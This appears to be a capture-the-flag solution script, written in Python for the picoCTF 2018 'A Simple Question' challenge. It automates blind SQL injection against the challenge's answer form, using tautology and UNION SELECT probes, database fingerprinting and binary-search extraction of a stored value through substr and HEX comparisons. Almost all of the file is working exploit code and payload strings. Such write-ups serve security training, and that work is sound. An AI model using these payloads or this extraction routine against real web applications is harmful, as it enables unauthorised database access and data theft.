
# exploit-A-Simple-Question.py
# by Sudoite

import requests
from math import floor

url = "http://2018shell.picoctf.com:2644/answer2.php"

# send post request and return True or False based on page content
def submit_query(answer:str, 
				debug:bool=False) -> bool:
	data = {'answer':answer, 'debug': str(0)}
	r = requests.post(url=url, data=data)
	if debug:
		print(r.text)
	if r.text.find("Wrong") != -1:
		return False
	else:
		return True

## Determine that the problem is vulnerable to blind SQLi.
#print(submit_query("42")) # False
#print(submit_query("42' OR '1'='1")) # True

## Determine the number of columns. 
#print(submit_query("42' OR '1'='1' UNION SELECT NULL, NULL'", debug=True))
#print(submit_query("42' OR '1'='1' UNION SELECT NULL'", debug=True))
# So, answers has one column in it.

## Fingerprint the database. 
#print(submit_query("42' OR '1' = '1' UNION SELECT table_schema, table_name, 1 FROM information_schema.tables --", debug=True))
#print(submit_query("42' OR '1'='1' UNION SELECT @@version'", debug=True)) # breaks
#print(submit_query("42' OR '1'='1' UNION SELECT version()'", debug=True))
#print(submit_query("42' OR '1'='1' UNION SELECT sqlite_version()'", debug=True)) 
# So we've fingerprinted the database, it's SQLite. Don't know the version but we could now get
# it from the union output if we needed it.

## Determine the number of rows.
#print(submit_query("42' OR '1'='1' LIMIT 0,1 --")) # That gives true
#print(submit_query("42' OR '1'='1' LIMIT 5,1 --")) # That gives false. So, there are fewer than 5 rows.
#print(submit_query("42' OR '1'='1' LIMIT 3,1 --")) # That gives false. So, there are fewer than 5 rows.
#print(submit_query("42' OR '1'='1' LIMIT 2,1 --")) # That gives false. So, there are fewer than 5 rows.
#print(submit_query("42' OR '1'='1' LIMIT 1,1 --")) # That gives false. So, there are fewer than 5 rows.
#print(submit_query("42' OR '1'='1' LIMIT 0,1 --")) # That gives false. So, there are fewer than 5 rows.
# This shows that there's only one entry in the 'answers' table.

# One thing I didn't learn here is how to get the column name, since I already know it this time.
# I'll save that lesson for another day.

## Learn how to get a substring from a table entry.
#print(submit_query("42' OR '1'='1' AND substr(answer,1,1) = '4")) # True, great.
#print(submit_query("42' OR '1'='1' AND HEX(substr(answer,1,1)) = '34")) # True, great
#print(submit_query("42' OR '1'='1' AND HEX(substr(answer,1,1)) = '35")) # False, great
#print(submit_query("42' OR '1'='1' AND HEX(substr(answer,1,1)) >= '33")) # True, great

## Next I write a function to do a binary search, and I use this to 
## determine both the length of a table entry and the contents of that string.

# For unit testing.
def greater_than_or_equal_to_53(guess):
	return guess >= 53

# For unit testing.
def greater_than_or_equal_to_6(guess):
	return guess >= 6

# The binary search function. Optionally takes an argument to pass to the function it's calling.
def binary_search(lower, upper, f, arg1=None):
	guess = floor((lower+upper)/2)
	if not f(guess, arg1):
		if lower == upper:
			return lower
		else:
			return binary_search((guess+1), upper, f, arg1)
	else:
		if lower == upper:
			return lower
		else:
			return binary_search(lower, guess, f, arg1)

#print("Binary search test...")
# Test 1 should return 6.
#print(binary_search(0,10, greater_than_or_equal_to_6))
#print(binary_search(6,11, greater_than_or_equal_to_6))
#print(binary_search(0,11, greater_than_or_equal_to_6))
#print(binary_search(-90,10, greater_than_or_equal_to_6))
#print(binary_search(3,6, greater_than_or_equal_to_6))
# Great, works.

# These should all return 53.
#print(binary_search(53,53, greater_than_or_equal_to_53))
#print(binary_search(6,53, greater_than_or_equal_to_53))
#print(binary_search(53,110, greater_than_or_equal_to_53))
#print(binary_search(0,77, greater_than_or_equal_to_53))
#print(binary_search(3,60, greater_than_or_equal_to_53))
#print(binary_search(33,63, greater_than_or_equal_to_53))
#print(binary_search(30,60, greater_than_or_equal_to_53))
# Great, works.

# Now I just need a true / false function that tests a letter.
def guess_greater_than_or_equal_to_hex_value(guess, index, debug=False):
	query = "42' OR '1'='1' AND '" + str.upper(hex(guess)[2:4]) + "' >= HEX(substr(answer," +str(index) + ",1));--"
	result = submit_query(query)
	if debug:
		print("guess = " + str(guess))
		print("Submitting query: " + str(query) + "\n")
		print("Result = " + str(result))
	return(result)

def guess_greater_than_or_equal_to_string_length(guess, arg1=None, debug=False):
	query = "42' OR '1'='1' AND " + str(guess) + " >= length(answer);--"
	result = submit_query(query)
	if debug:
		print("Submitting query: " + str(query) + "\n")
		print("Result = " + str(result))
	return(result)

def extract_letter(index, debug=False):
	hex_letter = str(binary_search(30, 122, guess_greater_than_or_equal_to_hex_value, i))
	if debug:
		print("hex_letter = " + hex_letter)
	return(chr(int(hex_letter,10)))

def get_answer_length():
	answer_length = binary_search(0, 128, guess_greater_than_or_equal_to_string_length)
	return(answer_length)


#print("Result of first binary search: " + str(binary_search(30, 122, guess_greater_than_or_equal_to_hex_value, i)))
#print("Result of first binary search: " + str(extract_letter(1)))
# Works! 

#print("String length test 1: " + str(guess_greater_than_or_equal_to_string_length(80))) # true
#print("String length test 1: " + str(guess_greater_than_or_equal_to_string_length(0)))
# Works!

# Great! Now, how long is the 'answer' string?
answer_length = get_answer_length()
print("Answer length = " + str(answer_length)) # 14, correct!
answer = ''
for i in range(1,answer_length+1):
	answer += extract_letter(i)
	print("ANSWER: " + str(answer))

print("The answer is " + answer)
#41AndSixSixths

## Print the flag.
print(submit_query("41AndSixSixths", debug=True))
